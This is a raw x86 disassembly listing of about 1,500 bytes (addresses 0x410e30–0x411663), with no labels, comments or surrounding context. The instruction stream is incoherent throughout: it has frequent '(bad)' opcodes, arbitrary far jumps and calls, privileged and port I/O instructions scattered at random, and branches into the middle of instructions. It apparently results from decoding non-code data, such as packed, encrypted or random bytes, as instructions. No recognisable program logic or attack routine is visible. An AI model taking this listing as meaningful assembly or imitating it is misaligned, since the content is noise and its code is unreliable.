  410e30:	rcl    BYTE PTR [edi-0x69938e59],0x4c
  410e37:	pop    es
  410e38:	jmp    0x410eac
  410e3a:	pop    edx
  410e3b:	arpl   WORD PTR [edi-0x132e202f],bx
  410e41:	push   eax
  410e42:	fs sbb dh,ch
  410e45:	push   0x29
  410e47:	lahf   
  410e48:	sub    edi,ecx
  410e4a:	pop    ebx
  410e4b:	push   0xa5c42d1a
  410e50:	cmp    bl,BYTE PTR [esi+0x63]
  410e53:	das    
  410e54:	adc    BYTE PTR [edi-0x2e],0x4e
  410e58:	sbb    al,0xd3
  410e5a:	or     ebx,ebp
  410e5c:	ins    DWORD PTR es:[edi],dx
  410e5d:	mov    ds:0xdcd73703,al
  410e62:	stos   DWORD PTR es:[edi],eax
  410e63:	clc    
  410e64:	nop
  410e65:	sbb    edx,DWORD PTR [edx]
  410e67:	pop    esi
  410e68:	test   al,0x51
  410e6a:	or     ebp,DWORD PTR [edi]
  410e6c:	push   ebp
  410e6d:	outs   dx,DWORD PTR ds:[esi]
  410e6e:	jmp    0x65c3:0x997bec19
  410e75:	(bad)  
  410e76:	sub    BYTE PTR [eax],dh
  410e78:	js     0x410ef2
  410e7a:	mov    cl,0x7
  410e7c:	les    eax,FWORD PTR [edi]
  410e7e:	xchg   edx,eax
  410e7f:	pop    ds
  410e80:	and    cl,BYTE PTR [edi+0x37]
  410e83:	jo     0x410e0f
  410e85:	pop    eax
  410e86:	loop   0x410e74
  410e88:	das    
  410e89:	xlat   BYTE PTR ds:[ebx]
  410e8a:	daa    
  410e8b:	adc    eax,0xe935cd07
  410e90:	cmp    DWORD PTR [ebx-0x55],ebx
  410e93:	adc    esp,0x54
  410e96:	in     eax,0x2c
  410e98:	aam    0x51
  410e9a:	fimul  WORD PTR [ebx-0x7f1509b2]
  410ea0:	push   edx
  410ea1:	add    ecx,edx
  410ea3:	lahf   
  410ea4:	(bad)  
  410ea5:	js     0x410e7b
  410ea7:	cdq    
  410ea8:	into   
  410ea9:	sbb    esp,esi
  410eab:	jbe    0x410e6e
  410ead:	(bad)  [edx]
  410eaf:	call   0x9b00:0x5666913f
  410eb6:	inc    esi
  410eb7:	ffreep st(7)
  410eb9:	es aam 0x6b
  410ebc:	ds sysexit 
  410ebf:	pop    eax
  410ec0:	sahf   
  410ec1:	add    al,bh
  410ec3:	push   cs
  410ec4:	outs   dx,BYTE PTR ds:[esi]
  410ec5:	push   ebx
  410ec6:	pmulhw mm2,QWORD PTR [eax]
  410ec9:	mov    dh,0x42
  410ecb:	add    eax,0x945e5200
  410ed0:	mov    ah,0x8e
  410ed2:	mov    edx,0xefc9eb53
  410ed7:	xchg   esi,eax
  410ed8:	mov    al,cl
  410eda:	pop    ss
  410edb:	mov    bl,0x78
  410edd:	xchg   edi,eax
  410ede:	cdq    
  410edf:	lea    edx,[edx]
  410ee1:	push   0x62dd7241
  410ee6:	push   eax
  410ee7:	add    eax,0xa34bb72a
  410eec:	jp     0x410ece
  410eee:	call   0xcb9e:0xc4073d09
  410ef5:	jnp    0x410e84
  410ef7:	pop    es
  410ef8:	(bad)  
  410ef9:	imul   BYTE PTR [edi-0x7b]
  410efc:	jmp    0x664b:0xc0b49d41
  410f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f04:	stos   BYTE PTR es:[edi],al
  410f05:	and    ebp,eax
  410f07:	dec    ecx
  410f08:	inc    esp
  410f09:	pop    eax
  410f0a:	mov    ds,WORD PTR [edi+0x62]
  410f0d:	mov    dh,0xb8
  410f0f:	pusha  
  410f10:	or     esi,DWORD PTR [eax+0x3c9dffb1]
  410f16:	pop    ss
  410f17:	aam    0x64
  410f19:	mov    WORD PTR [ebx-0x492b42cc],ss
  410f1f:	fcmove st,st(1)
  410f21:	lds    ebp,FWORD PTR [eax]
  410f23:	loop   0x410ea7
  410f25:	rol    DWORD PTR [ebx],1
  410f27:	mov    dl,0xa6
  410f29:	mov    ds:0x1fff6c4f,eax
  410f2e:	mov    ebx,edx
  410f30:	mov    ds:0x9ddbd9d8,al
  410f35:	mov    eax,ds:0xba3936a8
  410f3a:	and    al,0x31
  410f3c:	or     eax,0xfd140b6d
  410f41:	mov    edx,0x2c2ff904
  410f46:	pop    es
  410f47:	cmp    dh,BYTE PTR [esi-0x32]
  410f4a:	test   ah,dh
  410f4c:	mov    al,0x46
  410f4e:	or     edi,ebp
  410f50:	xor    al,cl
  410f52:	lock mov ah,0x60
  410f55:	xchg   DWORD PTR [ebx],ebx
  410f57:	push   esp
  410f58:	fwait
  410f59:	xor    eax,0x4bc93cf
  410f5e:	mov    bh,0x26
  410f60:	inc    ebp
  410f61:	rcl    BYTE PTR [edx-0x2ef1d537],0x84
  410f68:	or     BYTE PTR ds:0x6945800b,al
  410f6e:	cs push ebp
  410f70:	rcr    ebp,cl
  410f72:	jp     0x410f09
  410f74:	repnz adc bl,bl
  410f77:	push   edi
  410f78:	ins    BYTE PTR es:[edi],dx
  410f79:	retf   
  410f7a:	pushf  
  410f7b:	imul   edi,DWORD PTR [ecx+0x49bacf4a],0xffffffc5
  410f82:	add    al,0xfe
  410f84:	mov    WORD PTR [ecx],es
  410f86:	popa   
  410f87:	test   BYTE PTR [eax+0x70],bl
  410f8a:	pop    ss
  410f8b:	pusha  
  410f8c:	ja     0x410f10
  410f8e:	arpl   WORD PTR [esi-0x1948402a],ax
  410f94:	daa    
  410f95:	imul   ebp,DWORD PTR [eax+0x7c621af5],0xaa42e1f0
  410f9f:	mov    cl,0xa8
  410fa1:	shl    DWORD PTR [edx+0x73d60a9d],1
  410fa7:	sub    cl,bl
  410fa9:	dec    edx
  410faa:	dec    ebx
  410fab:	int    0x22
  410fad:	ins    DWORD PTR es:[edi],dx
  410fae:	xchg   edi,eax
  410faf:	adc    esp,ebp
  410fb1:	shl    ebp,0x4a
  410fb4:	fst    DWORD PTR [ebp+0x2c14966c]
  410fba:	adc    al,0x69
  410fbc:	add    bh,BYTE PTR [eax+0x5a]
  410fbf:	mov    es,WORD PTR [eax-0x69]
  410fc2:	fs fdivrp st(2),st
  410fc5:	mov    esp,0x854c290b
  410fca:	xor    cl,BYTE PTR [esi-0x22de0de4]
  410fd0:	fpatan 
  410fd2:	outs   dx,BYTE PTR ds:[esi]
  410fd3:	gs scas eax,DWORD PTR es:[edi]
  410fd5:	fs dec esp
  410fd7:	shl    edi,0xcc
  410fda:	xchg   ecx,eax
  410fdb:	add    BYTE PTR [ebp+ebx*1+0x1f],ah
  410fdf:	pop    edi
  410fe0:	pop    ecx
  410fe1:	cli    
  410fe2:	fimul  WORD PTR [ebx-0x5efd6040]
  410fe9:	push   eax
  410fea:	ficomp WORD PTR [ecx-0x6]
  410fed:	pusha  
  410fee:	imul   ebx,eax,0xe5ab288f
  410ff4:	adc    eax,0x445479ed
  410ff9:	push   0x6d
  410ffb:	mov    al,ds:0x10024d8b
  411000:	dec    esi
  411001:	xchg   BYTE PTR [ecx-0x5a],al
  411004:	push   esp
  411005:	push   0x88ae6c46
  41100a:	(bad)  
  41100b:	pop    ds
  41100c:	sbb    ecx,DWORD PTR [esi]
  41100e:	ss nop
  411010:	hlt    
  411011:	ja     0x410f95
  411013:	sbb    BYTE PTR [eax+0x42],al
  411016:	rol    DWORD PTR [ebp+0x725c1f92],0x84
  41101d:	test   eax,0x7f68996f
  411022:	mov    DWORD PTR [esi+0x4ab02928],esp
  411028:	imul   edi,DWORD PTR ds:[ebx+esi*4-0x6d78d258],0xf50aaaa2
  411034:	xlat   BYTE PTR ds:[ebx]
  411035:	fistp  QWORD PTR [edi]
  411037:	rcr    DWORD PTR [edx+0x2273aa9a],cl
  41103d:	jg     0x4110b2
  41103f:	add    al,0xc3
  411041:	pop    edx
  411042:	xlat   BYTE PTR ds:[ebx]
  411043:	push   esi
  411044:	dec    ecx
  411045:	or     BYTE PTR [edx+0x34dfb1a1],ah
  41104b:	sbb    al,0xd2
  41104d:	addr16 cld 
  41104f:	jnp    0x4110c2
  411051:	int3   
  411052:	fdiv   st(7),st
  411054:	inc    ecx
  411055:	daa    
  411056:	mov    edx,edx
  411058:	dec    esi
  411059:	addr16 mov esi,0xa789a3c1
  41105f:	jl     0x4110bb
  411061:	mov    ecx,0xde38ff45
  411066:	mov    ebp,0x87ee8ef4
  41106b:	gs mov dl,0x9
  41106e:	iret   
  41106f:	xchg   ah,dl
  411071:	mov    ah,0x9d
  411073:	adc    ecx,DWORD PTR [ecx-0x5424016f]
  411079:	test   eax,0xe4ba4780
  41107e:	sub    DWORD PTR [edx+ebx*4],edx
  411081:	pop    ebx
  411082:	lahf   
  411083:	add    al,0x6e
  411085:	es pop esi
  411087:	add    eax,0x32115d22
  41108c:	jmp    0x2f83:0x3cc4afdb
  411093:	mov    al,0x57
  411095:	or     DWORD PTR [edx+0xd9308e2],ecx
  41109b:	into   
  41109c:	ficomp DWORD PTR [eax+0x25]
  41109f:	mov    ch,0x4e
  4110a1:	imul   eax,DWORD PTR [eax-0x6f],0xfffffffe
  4110a5:	mov    al,BYTE PTR gs:0x65b8c85f
  4110ac:	push   ds
  4110ad:	sbb    DWORD PTR [edx-0x28],eax
  4110b0:	mov    bh,ah
  4110b2:	mov    ebx,0xb365de32
  4110b7:	mov    esp,0x8d70956
  4110bc:	pop    esp
  4110bd:	(bad)  
  4110be:	sti    
  4110bf:	popf   
  4110c0:	(bad)  
  4110c1:	stc    
  4110c2:	pop    ss
  4110c3:	dec    ecx
  4110c4:	and    al,0xca
  4110c6:	stc    
  4110c7:	inc    edi
  4110c8:	sbb    esp,DWORD PTR [edx-0xcd2f8f3]
  4110ce:	cmp    al,0x98
  4110d0:	out    0x4a,al
  4110d2:	aad    0x23
  4110d4:	icebp  
  4110d5:	pop    ss
  4110d6:	adc    ebp,DWORD PTR [edx+0x23]
  4110d9:	mov    edx,ecx
  4110db:	mov    ch,0x25
  4110dd:	rol    BYTE PTR [esi],0xc8
  4110e0:	cmovle edx,DWORD PTR [ebx+ebx*4]
  4110e4:	into   
  4110e5:	pop    esp
  4110e6:	out    0x42,al
  4110e8:	ds sbb edi,DWORD PTR ds:[edi-0x54626ec8]
  4110f0:	fmul   QWORD PTR ds:0x480a1c40
  4110f6:	bound  ebp,QWORD PTR [edi+eax*8+0x53b45e68]
  4110fd:	sbb    al,0x2
  4110ff:	nop
  411100:	out    dx,al
  411101:	scas   eax,DWORD PTR es:[edi]
  411102:	aam    0x7b
  411104:	fs mov ah,0xe
  411107:	xchg   ebx,eax
  411108:	cmp    DWORD PTR [edx],esp
  41110a:	das    
  41110b:	mov    ds:0x638f461d,eax
  411110:	fwait
  411111:	not    BYTE PTR [ecx-0x37abd0ab]
  411117:	imul   esi,ecx,0xfffffff3
  41111a:	loop   0x411118
  41111c:	xchg   BYTE PTR [eax-0x49e66f85],dl
  411122:	jmp    0x2f6c:0xd33fc571
  411129:	sahf   
  41112a:	popa   
  41112b:	mov    esi,0x7f7c40be
  411130:	jae    0x4111a9
  411132:	ret    0x701a
  411135:	das    
  411136:	shl    DWORD PTR [edi],1
  411138:	mov    esi,0xa9c5ec9e
  41113d:	ins    DWORD PTR es:[edi],dx
  41113e:	xchg   BYTE PTR [eax-0x334d4c5d],dh
  411144:	xchg   esi,eax
  411145:	or     al,0x35
  411147:	aad    0x9a
  411149:	add    al,0x6d
  41114b:	xor    edi,DWORD PTR [ebx+0x7e]
  41114e:	cld    
  41114f:	sub    BYTE PTR [ebp+0x1a],al
  411152:	lock popf 
  411154:	or     eax,0x89257982
  411159:	ficomp DWORD PTR [esi]
  41115b:	test   al,0x47
  41115d:	fisttp DWORD PTR [edx+0x36]
  411160:	pop    ecx
  411161:	cs sbb al,0x8f
  411164:	call   0xa8fbe0fd
  411169:	out    dx,eax
  41116a:	ins    BYTE PTR es:[edi],dx
  41116b:	test   eax,0x13be6095
  411170:	ins    DWORD PTR es:[edi],dx
  411171:	sbb    ch,bl
  411173:	xchg   esp,eax
  411174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411176:	mov    esp,0xfdcb3dc9
  41117b:	dec    ebx
  41117c:	test   eax,0x6797df0b
  411181:	ret    
  411182:	cmp    al,0x79
  411184:	iret   
  411185:	jb     0x4111d4
  411187:	adc    ch,BYTE PTR [ebx]
  411189:	xor    dl,ch
  41118b:	mov    esi,DWORD PTR [ebp-0x1e0c6f5b]
  411191:	mov    dl,0x51
  411193:	cmp    cl,dl
  411195:	push   es
  411196:	push   ebx
  411197:	mov    eax,0x61ca0b9d
  41119c:	fild   QWORD PTR [edx+esi*1]
  41119f:	sahf   
  4111a0:	fnstsw WORD PTR [ecx-0x1]
  4111a3:	pop    esi
  4111a4:	pusha  
  4111a5:	aaa    
  4111a6:	mov    edx,0x907a0c42
  4111ab:	mov    ch,0x2e
  4111ad:	daa    
  4111ae:	push   ebp
  4111af:	ret    
  4111b0:	xchg   edx,eax
  4111b1:	test   eax,0x49f3dc94
  4111b6:	and    edi,DWORD PTR [edi]
  4111b8:	inc    ebx
  4111b9:	inc    edx
  4111ba:	cmp    BYTE PTR gs:[edx],ah
  4111bd:	inc    eax
  4111be:	push   edi
  4111bf:	mov    ds:0xaae694fe,al
  4111c4:	rcl    DWORD PTR [ecx+0x7e],1
  4111c7:	aaa    
  4111c8:	lods   eax,DWORD PTR ds:[esi]
  4111c9:	outs   dx,DWORD PTR ds:[esi]
  4111ca:	popf   
  4111cb:	adc    al,0x48
  4111cd:	adc    al,0x96
  4111cf:	xchg   DWORD PTR [ebx+0xbc470e],edi
  4111d5:	push   ss
  4111d6:	adc    eax,0x7d5e4442
  4111db:	mov    edx,0xd239407d
  4111e0:	add    al,0x82
  4111e2:	sub    bl,dh
  4111e4:	push   ebx
  4111e5:	sub    al,BYTE PTR [esi-0xd370c0d]
  4111eb:	mov    al,ds:0x723d675e
  4111f0:	inc    esi
  4111f1:	and    DWORD PTR [eax+0xd],0x99d043df
  4111f8:	or     BYTE PTR [esp+ebx*4+0x5a],ah
  4111fc:	dec    ebx
  4111fd:	and    DWORD PTR [ebx-0x34c2a0b],ecx
  411203:	sub    eax,0x7e86afb6
  411208:	inc    ecx
  411209:	mov    DWORD PTR [edx+0x1b],esp
  41120c:	pop    esi
  41120d:	test   DWORD PTR [edx+0x3],edx
  411210:	sbb    bh,al
  411212:	push   edi
  411213:	imul   eax,DWORD PTR [ecx+0x66],0xffffffaa
  411217:	loop   0x4111fe
  411219:	loope  0x41119e
  41121b:	outs   dx,WORD PTR ds:[esi]
  41121d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41121e:	(bad)  
  41121f:	jae    0x411208
  411221:	mov    dh,0xc4
  411223:	ss test al,0x7d
  411226:	shl    DWORD PTR [edi],cl
  411228:	jns    0x4111b7
  41122a:	mov    al,ds:0x847100b8
  41122f:	rcr    DWORD PTR [edx-0x4d],0x31
  411233:	rcl    BYTE PTR [ecx],cl
  411235:	xchg   DWORD PTR [ecx+0x3a],ecx
  411238:	paddw  mm4,QWORD PTR [edx+esi*8+0x44525ac5]
  411240:	mov    edi,eax
  411242:	push   ebp
  411243:	jmp    0x62aaed86
  411248:	pop    ebp
  411249:	and    esi,eax
  41124b:	outs   dx,DWORD PTR ds:[esi]
  41124c:	arpl   WORD PTR [edi+edi*2+0x5874aede],di
  411253:	test   al,0x68
  411255:	fnsave [esi-0x6e9ad551]
  41125b:	and    eax,0x6f2749d1
  411260:	ret    
  411261:	mov    cl,BYTE PTR [edi+0x50]
  411264:	dec    eax
  411265:	jmp    0x48f46ca9
  41126a:	data16 adc bh,BYTE PTR [edx+0x13b3524e]
  411271:	cmp    edi,DWORD PTR [ecx]
  411273:	push   es
  411274:	test   edi,ecx
  411276:	mov    bh,0x11
  411278:	je     0x411219
  41127a:	out    0xea,al
  41127c:	adc    BYTE PTR [esi+0x6f],dh
  41127f:	jecxz  0x4112bd
  411281:	in     eax,0xb0
  411283:	mov    edi,0x274e1c5c
  411288:	outs   dx,BYTE PTR ds:[esi]
  411289:	jl     0x41126c
  41128b:	mov    BYTE PTR [esp+ecx*4-0x737ee834],al
  411292:	cmp    eax,0xebe3384a
  411297:	(bad)  
  411298:	mov    edi,0xe9d5c9a5
  41129d:	push   ebp
  41129e:	jge    0x411279
  4112a0:	and    ah,BYTE PTR [ebx+0x22d842e9]
  4112a6:	xchg   edi,eax
  4112a7:	sbb    eax,0x7a87849c
  4112ac:	and    BYTE PTR [ebx+0x2c0915fd],ch
  4112b2:	fldcw  WORD PTR [edx-0x3f533c92]
  4112b8:	push   edx
  4112b9:	add    eax,ebx
  4112bb:	xlat   BYTE PTR ds:[ebx]
  4112bc:	cmp    eax,0xdc302806
  4112c1:	jecxz  0x4112bb
  4112c3:	xlat   BYTE PTR ds:[ebx]
  4112c4:	pop    edi
  4112c5:	jmp    0x411278
  4112c7:	cli    
  4112c8:	dec    DWORD PTR [edi+eax*8]
  4112cb:	inc    esi
  4112cc:	jb     0x411328
  4112ce:	pop    esi
  4112cf:	or     BYTE PTR [edx+0x7871aee7],dh
  4112d5:	mov    al,ds:0xe300e9a4
  4112da:	shl    BYTE PTR [eax-0x83b5f81],1
  4112e0:	icebp  
  4112e1:	ret    0x8dd4
  4112e4:	xor    ebp,esp
  4112e6:	jno    0x411356
  4112e8:	xor    ah,BYTE PTR [ecx-0x1abdb6ed]
  4112ee:	mov    dl,0x6d
  4112f0:	bound  ebp,QWORD PTR [ecx-0x2f]
  4112f3:	out    dx,eax
  4112f4:	aas    
  4112f5:	xchg   ebx,eax
  4112f6:	push   esp
  4112f7:	sbb    al,0x52
  4112f9:	jg     0x4112f4
  4112fb:	(bad)  
  4112fc:	pop    ebp
  4112fd:	mov    edx,fs
  4112ff:	mov    ch,0xae
  411301:	addr16 mov edi,0xb9f7b22e
  411307:	jne    0x4112c7
  411309:	int3   
  41130a:	mov    dh,0x84
  41130c:	jbe    0x4112f9
  41130e:	sub    ah,BYTE PTR [ebx+edi*4-0x3f]
  411312:	test   al,0xf3
  411314:	xchg   edx,eax
  411315:	retf   
  411316:	push   edi
  411317:	cli    
  411318:	and    eax,0x1c422bd9
  41131d:	scas   eax,DWORD PTR es:[edi]
  41131e:	sbb    BYTE PTR [esi+0x181b7452],0xa0
  411325:	and    eax,0xe9001179
  41132a:	mov    eax,0xc5c449a6
  41132f:	adc    dh,BYTE PTR ds:0xf73fa88
  411335:	and    eax,0x46a3f6dc
  41133a:	sub    BYTE PTR [ebp+0x47],0xba
  41133e:	les    esp,FWORD PTR [ecx+0x652a160c]
  411344:	les    edi,FWORD PTR [ebp+ecx*8-0x32]
  411348:	aad    0x73
  41134a:	mov    ds:0xad198c1c,eax
  41134f:	adc    DWORD PTR [ebx+0x1afd5f31],esp
  411355:	push   eax
  411356:	das    
  411357:	fnstenv [edx+0x1b867189]
  41135d:	ss mov al,0x30
  411360:	mov    bh,0xfa
  411362:	xchg   edi,eax
  411363:	popa   
  411364:	mov    edi,0x3bbe243
  411369:	mov    al,ds:0x2a7bd306
  41136e:	out    dx,eax
  41136f:	sbb    eax,0x4ba8c5a6
  411374:	jp     0x411322
  411376:	inc    edx
  411377:	cmp    ch,dl
  411379:	test   dh,cl
  41137b:	jae    0x411351
  41137d:	das    
  41137e:	inc    ebp
  41137f:	adc    eax,0x3c226a32
  411384:	stos   DWORD PTR es:[edi],eax
  411385:	sub    eax,0x9fc04a9e
  41138a:	sbb    edi,DWORD PTR [ecx+0x6c]
  41138d:	adc    DWORD PTR [eax+0x14],0xa79978f9
  411394:	push   0xffffff91
  411396:	sub    edx,DWORD PTR [ecx-0x37b7599e]
  41139c:	mov    al,ds:0x222a91c
  4113a1:	dec    esp
  4113a2:	mov    bl,0x8d
  4113a4:	sbb    bl,0x6c
  4113a7:	mov    bh,0x6f
  4113a9:	gs xchg ecx,eax
  4113ab:	xor    BYTE PTR [eax+0x1e],0xd3
  4113af:	mov    edi,0xf8ddf028
  4113b4:	jmp    0x3654:0x909aacc5
  4113bb:	or     DWORD PTR [eax],edi
  4113bd:	pop    eax
  4113be:	lock add ebx,edi
  4113c1:	popa   
  4113c2:	xor    DWORD PTR ds:0xe3880bb9,0x46
  4113c9:	push   edi
  4113ca:	in     eax,0x6a
  4113cc:	mov    WORD PTR [ecx-0x5b7c9365],gs
  4113d2:	cmp    BYTE PTR [eax-0x47c3c5c],al
  4113d8:	clc    
  4113d9:	or     BYTE PTR [ecx],dl
  4113db:	mov    DWORD PTR [eax-0x5e9557e3],edx
  4113e1:	(bad)  
  4113e2:	push   0x4f42afad
  4113e7:	hlt    
  4113e8:	shl    DWORD PTR [eax-0xb],0x44
  4113ec:	leave  
  4113ed:	inc    esp
  4113ee:	xchg   DWORD PTR [ecx-0x2c31a353],ecx
  4113f4:	mov    al,BYTE PTR [ecx]
  4113f6:	mov    dh,0x4f
  4113f8:	jp     0x411385
  4113fa:	dec    ebp
  4113fb:	test   al,cl
  4113fd:	adc    al,0xfc
  4113ff:	add    BYTE PTR [ecx],bh
  411401:	xor    eax,0x91f5e33
  411406:	pop    ecx
  411407:	dec    esi
  411408:	xchg   ebp,eax
  411409:	add    dh,bl
  41140b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41140c:	mulps  xmm4,XMMWORD PTR [ecx-0x19]
  411410:	xor    ebx,DWORD PTR [eax+0x8]
  411413:	leave  
  411414:	xchg   edx,eax
  411415:	pushf  
  411416:	sbb    bh,BYTE PTR [edx-0x5737eb23]
  41141c:	iret   
  41141d:	fneni(8087 only) 
  41141f:	jge    0x4113d3
  411421:	jmp    0x4113ca
  411423:	mov    ah,ah
  411425:	push   cs
  411426:	inc    eax
  411427:	cdq    
  411428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411429:	wbinvd 
  41142b:	pop    DWORD PTR [esp+ecx*2+0x7a5809b7]
  411432:	push   edi
  411433:	call   0x26da8d82
  411438:	imul   ebp,DWORD PTR [ebx+0x7d97d1b9],0x50
  41143f:	js     0x41141d
  411441:	mov    cl,0x65
  411443:	sbb    DWORD PTR [edi],edx
  411445:	fs sbb eax,0xd9fa7cf4
  41144b:	add    al,0xc5
  41144d:	test   eax,0x470132d2
  411452:	push   ebx
  411453:	cmp    al,0xbb
  411455:	aaa    
  411456:	xor    esp,ebp
  411458:	jecxz  0x411495
  41145a:	lds    esi,FWORD PTR [eax+eiz*8-0x72a98993]
  411461:	xor    BYTE PTR [eax],dh
  411463:	(bad)  
  411464:	(bad)  
  411465:	aas    
  411466:	xor    BYTE PTR ss:0x356d0f6a,al
  41146d:	push   ds
  41146e:	cld    
  41146f:	aam    0x43
  411471:	xchg   esi,eax
  411472:	mov    edi,0x48b111b0
  411477:	ds add eax,0x43e24969
  41147d:	add    eax,0x3ff45582
  411482:	outs   dx,BYTE PTR ds:[esi]
  411483:	inc    eax
  411484:	test   DWORD PTR [edi],esp
  411486:	div    DWORD PTR [ebx-0x6b]
  411489:	xchg   edx,eax
  41148a:	dec    ebx
  41148b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41148c:	cli    
  41148d:	mov    al,0xe1
  41148f:	mov    dl,0xf4
  411491:	lods   al,BYTE PTR ds:[esi]
  411492:	hlt    
  411493:	rol    BYTE PTR [esi+edx*4],cl
  411496:	adc    DWORD PTR [eax],ebp
  411498:	add    eax,0xb05bca50
  41149d:	xor    eax,0x9ae48deb
  4114a2:	sbb    eax,0xb9e1a5eb
  4114a7:	add    ecx,DWORD PTR [eax-0x48]
  4114aa:	adc    edx,DWORD PTR [esi+0x5f]
  4114ad:	outs   dx,BYTE PTR ds:[esi]
  4114ae:	sub    BYTE PTR [ecx],0xef
  4114b1:	pop    ss
  4114b2:	jle    0x4114ed
  4114b4:	cli    
  4114b5:	push   ebx
  4114b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b7:	fiadd  DWORD PTR [edx-0x1a]
  4114ba:	mov    eax,ds:0x4ee9e87b
  4114bf:	inc    esp
  4114c0:	pop    ecx
  4114c1:	adc    BYTE PTR [eax],ch
  4114c3:	push   DWORD PTR [esi-0x433cd4ce]
  4114c9:	inc    ecx
  4114ca:	arpl   WORD PTR [edi-0x914d5ff],dx
  4114d0:	sbb    DWORD PTR [edx-0x22b49846],0xc2738578
  4114da:	jo     0x411529
  4114dc:	jae    0x4114b0
  4114de:	adc    al,0x0
  4114e0:	adc    DWORD PTR [eax-0x75],edx
  4114e3:	sti    
  4114e4:	aas    
  4114e5:	mov    BYTE PTR [esi+0x51421b05],0x8e
  4114ec:	mov    cl,0x14
  4114ee:	sub    dh,BYTE PTR [ecx]
  4114f0:	add    BYTE PTR [esi],cl
  4114f2:	stc    
  4114f3:	retf   
  4114f4:	mov    es,WORD PTR [edx+0x7e]
  4114f7:	mov    ecx,0xefe0c11a
  4114fc:	cmp    BYTE PTR [ebx+esi*2+0x4b73574c],dh
  411503:	pop    edx
  411504:	fiadd  WORD PTR [edx-0x693a3303]
  41150a:	sub    eax,0xb87abe28
  41150f:	sbb    ah,BYTE PTR [edx+0x0]
  411512:	jnp    0x411571
  411514:	or     al,0x51
  411516:	mov    al,0xf3
  411518:	test   al,0xbc
  41151a:	cmp    eax,0x133ee305
  41151f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411520:	rcl    BYTE PTR [esi+0x35c9d43b],1
  411526:	cli    
  411527:	test   cl,dl
  411529:	xchg   DWORD PTR [eax+0x28],edx
  41152c:	(bad)  ds:0xd66dfec8
  411532:	cmp    BYTE PTR [ebx-0x9],cl
  411535:	(bad)  
  411538:	cli    
  411539:	xor    edi,esi
  41153b:	ret    0x20bd
  41153e:	leave  
  41153f:	dec    ecx
  411540:	pop    ebx
  411541:	ficom  DWORD PTR [ecx+0x17]
  411544:	call   0xc3b5:0x230a0
  41154b:	jo     0x4114da
  41154d:	outs   dx,BYTE PTR ds:[esi]
  41154e:	popf   
  41154f:	fbld   TBYTE PTR [eax+0x12]
  411552:	xor    esp,ecx
  411554:	das    
  411555:	lock cmc 
  411557:	mov    eax,ds:0x31f179db
  41155c:	xchg   ebx,eax
  41155d:	retf   
  41155e:	add    ebp,DWORD PTR [edx]
  411560:	jo     0x411571
  411562:	rcr    edi,1
  411564:	xlat   BYTE PTR ds:[ebx]
  411565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411566:	int    0xbc
  411568:	(bad)  
  411569:	imul   edi,DWORD PTR [edi],0x12
  41156c:	push   ds
  41156d:	adc    ecx,ecx
  41156f:	push   ebx
  411570:	pop    ecx
  411571:	add    al,bh
  411573:	pop    es
  411574:	in     eax,0x2b
  411576:	(bad)  [esp+edx*8-0x29]
  41157a:	push   eax
  41157b:	dec    edx
  41157c:	and    DWORD PTR [ecx+0x1743c58f],edi
  411582:	in     eax,dx
  411583:	add    al,0x76
  411585:	sub    ebp,DWORD PTR [eax+esi*1+0x2ff7a8b3]
  41158c:	aam    0xe4
  41158e:	push   ds
  41158f:	and    ecx,DWORD PTR ds:0x17665fbb
  411595:	test   edi,0xa3776621
  41159b:	mov    esp,0x10fb2d42
  4115a0:	(bad)  
  4115a1:	jg     0x41154c
  4115a3:	inc    esp
  4115a4:	sbb    eax,0xd4998af
  4115a9:	jmp    0x555b:0x89bfae57
  4115b0:	imul   ebp,DWORD PTR [ecx-0x22],0x18
  4115b4:	xchg   edx,eax
  4115b5:	cmp    cl,BYTE PTR [esi+0x50ecd760]
  4115bb:	or     eax,0x52346f78
  4115c0:	push   eax
  4115c1:	rcr    DWORD PTR [ecx+0x4c],1
  4115c4:	pop    esp
  4115c5:	out    0xe7,al
  4115c7:	add    eax,edx
  4115c9:	dec    edx
  4115ca:	stos   DWORD PTR es:[edi],eax
  4115cb:	mov    ebx,0x571b0fa9
  4115d0:	out    dx,eax
  4115d1:	ret    0x5882
  4115d4:	xor    DWORD PTR ds:0x58b5a5fa,0xffde8dbd
  4115de:	jnp    0x41165a
  4115e0:	mov    edi,0xc04d49c6
  4115e5:	imul   edx,ebp,0xffffffb9
  4115e8:	dec    ecx
  4115e9:	sbb    edx,ecx
  4115eb:	lods   al,BYTE PTR ds:[esi]
  4115ec:	nop
  4115ed:	jb     0x411653
  4115ef:	cmp    eax,0x87c51d34
  4115f4:	pop    es
  4115f5:	retf   
  4115f6:	(bad)  
  4115f7:	pop    eax
  4115f8:	shl    esi,0xe3
  4115fb:	sub    BYTE PTR [bx+si+0x7e],bh
  4115ff:	scas   eax,DWORD PTR es:[edi]
  411600:	add    eax,edx
  411602:	cmp    eax,0x7d57fbd1
  411607:	pop    edx
  411608:	jnp    0x41158a
  41160a:	or     eax,0x2c2ff67f
  41160f:	retf   
  411610:	out    dx,eax
  411611:	test   DWORD PTR [eax-0x2f],ebx
  411614:	mov    BYTE PTR [ecx-0x7f6673ee],0x5c
  41161b:	jle    0x41168c
  41161d:	sub    al,0x35
  41161f:	lods   al,BYTE PTR ds:[esi]
  411620:	adc    al,dl
  411622:	xchg   edx,eax
  411623:	fstp   DWORD PTR [ecx-0x7a]
  411626:	test   eax,0x1525eaf0
  41162b:	mov    esi,0x3e50e6b4
  411630:	push   esi
  411631:	pop    edx
  411632:	dec    ebp
  411633:	int    0x21
  411635:	push   edx
  411636:	adc    dl,BYTE PTR [ebp-0x3]
  411639:	mov    ds:0x74108744,al
  41163e:	adc    BYTE PTR [esi+0x15788e7a],ah
  411644:	es cwde 
  411646:	jp     0x4115f5
  411648:	mov    eax,ds:0x867c5bfd
  41164d:	push   edx
  41164e:	and    eax,0xbc86934f
  411653:	mov    esi,edx
  411655:	stos   BYTE PTR es:[edi],al
  411656:	icebp  
  411657:	into   
  411658:	mov    edx,0x83818e97
  41165d:	mov    dl,0x7b
  41165f:	enter  0x7bb7,0xf7
  411663:	and    al,0x54
